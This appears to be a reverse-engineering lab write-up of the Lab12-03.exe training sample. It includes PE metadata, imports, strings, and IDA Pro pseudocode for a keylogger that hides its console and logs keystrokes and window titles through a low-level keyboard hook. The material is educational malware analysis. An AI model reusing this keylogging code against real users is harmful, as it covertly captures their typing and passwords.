Lab12-03.exe
    PE Analysis
        # Virustotal
            53/70
            SHA-256: 9b683d2fda7ca7adcc043e4412271009a0e115ca55f9a718c385a3f46b57ae6b

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-03-16 05:57:55

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	11574	12288	6.29	65feae0c52dc1190b7fe4fd528a8f5c3
                .rdata	16384	2182	4096	3.4	9959bb9d8402dfdd64f5d79ea795372b
                .data	20480	4220	4096	0.97	63c79e0036cc7b95d0e08712c7050cc1

            IMPORT
                KERNEL32.dll
                    HeapFree
                    GetStdHandle
                    LCMapStringW
                    SetHandleCount
                    GetOEMCP
                    LCMapStringA
                    HeapDestroy
                    ExitProcess
                    GetEnvironmentStringsW
                    GetModuleFileNameA
                    RtlUnwind
                    LoadLibraryA
                    FreeEnvironmentStringsA
                    GetCurrentProcess
                    GetEnvironmentStrings
                    GetCPInfo
                    UnhandledExceptionFilter
                    MultiByteToWideChar
                    FreeEnvironmentStringsW
                    GetCommandLineA
                    GetProcAddress
                    GetModuleHandleA
                    WideCharToMultiByte
                    GetStringTypeA
                    SetFilePointer
                    WriteFile
                    GetStartupInfoA
                    CloseHandle
                    GetACP
                    HeapReAlloc
                    GetStringTypeW
                    TerminateProcess
                    HeapCreate
                    VirtualFree
                    AllocConsole
                    GetFileType
                    CreateFileA
                    HeapAlloc
                    GetVersion
                    VirtualAlloc
                USER32.dll
                    GetMessageA
                    GetForegroundWindow
                    SetWindowsHookExA
                    UnhookWindowsHookEx
                    ShowWindow
                    GetWindowTextA
                    FindWindowA
                    CallNextHookEx

        # strings.exe (Only part of the results)
            [Window:
            ConsoleWindowClass
            practicalmalwareanalysis.log
            [SHIFT]
            [ENTER]
            [BACKSPACE]
            BACKSPACE
            [TAB]
            [CTRL]
            [DEL]
            [CAPS LOCK]
            [CAPS LOCK]

    Dynamic Analysis
        Refer to Lab12-02.txt

        # IDA Pro
            int __cdecl main(int argc, const char **argv, const char **envp)
            {
            AllocConsole();
            hWnd = FindWindowA(ConsoleWindowClass, 0);
            if ( hWnd )
                ShowWindow(hWnd, 0);
            memset(byte_405350, 1, 0x400u);
            current_proc_handler = GetModuleHandleA(0);
            hhk = SetWindowsHookExA(13, fn, current_proc_handler, 0);           // idHook:13 -> WH_KEYBOARD_LL
            while ( GetMessageA(0, 0, 0, 0) );                                  // return to hook
            return UnhookWindowsHookEx(hhk);
            }

            LRESULT __stdcall fn(int code, WPARAM wParam, LPARAM lParam)
            {
            if ( !code && (wParam == 260 || wParam == 256) )
                sub_4010C7(*(_DWORD *)lParam);
            return CallNextHookEx(0, code, wParam, lParam);
            }

            HANDLE __cdecl sub_4010C7(int Buffer)
            {
            NumberOfBytesWritten = 0;
            result = CreateFileA(practicalmalwareanalysis_log, 0x40000000u, 2u, 0, 4u, 0x80u, 0);
            hFile = result;
            if ( result != (HANDLE)-1 )
            {
                SetFilePointer(result, 0, 0, 2u);
                v2 = GetForegroundWindow();                 // Active window
                GetWindowTextA(v2, ::Buffer, 1024);         // Title text of window
                if ( strcmp(byte_405350, ::Buffer) )
                {
                WriteFile(hFile, aWindow, 0xCu, &NumberOfBytesWritten, 0);
                v3 = strlen(::Buffer);
                WriteFile(hFile, ::Buffer, v3, &NumberOfBytesWritten, 0);
                WriteFile(hFile, asc_40503C, 4u, &NumberOfBytesWritten, 0);
                strncpy(byte_405350, ::Buffer, 0x3FFu);
                byte_40574F = 0;
                }
                if ( (unsigned int)Buffer < 0x27 || (unsigned int)Buffer > 0x40 )
                {
                if ( (unsigned int)Buffer <= 0x40 || (unsigned int)Buffer >= 0x5B )
                {
                    switch ( Buffer )
                    {
                    case 8:
                        v4 = strlen(aBackspace);
                        WriteFile(hFile, aBackspace_0, v4, &NumberOfBytesWritten, 0);
                        break;
                    case 9:
                        WriteFile(hFile, aTab, 5u, &NumberOfBytesWritten, 0);
                        break;
                    case 13:
                        WriteFile(hFile, aEnter, 8u, &NumberOfBytesWritten, 0);
                        break;
                    case 16:
                        WriteFile(hFile, aShift, 7u, &NumberOfBytesWritten, 0);
                        break;
                    case 17:
                        WriteFile(hFile, aCtrl, 6u, &NumberOfBytesWritten, 0);
                        break;
                    case 20:
                        v5 = strlen(aCapsLock);
                        WriteFile(hFile, aCapsLock_0, v5, &NumberOfBytesWritten, 0);
                        break;
                    case 32:
                        WriteFile(hFile, asc_405074, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 46:
                        WriteFile(hFile, aDel, 5u, &NumberOfBytesWritten, 0);
                        break;
                    case 96:
                        WriteFile(hFile, a0, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 97:
                        WriteFile(hFile, a1, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 98:
                        WriteFile(hFile, a2, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 99:
                        WriteFile(hFile, a3, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 100:
                        WriteFile(hFile, a4, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 101:
                        WriteFile(hFile, a5, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 102:
                        WriteFile(hFile, a6, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 103:
                        WriteFile(hFile, a7, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 104:
                        WriteFile(hFile, a8, 1u, &NumberOfBytesWritten, 0);
                        break;
                    case 105:
                        WriteFile(hFile, a9, 1u, &NumberOfBytesWritten, 0);
                        break;
                    default:
                        break;
                    }
                }
                else
                {
                    Buffer += 32;
                    WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, 0);
                }
                }
                else
                {
                WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, 0);
                }
                result = (HANDLE)CloseHandle(hFile);
            }
            return result;
            }

Analysis
    This malware will use hook technique to log the keyboard events.         
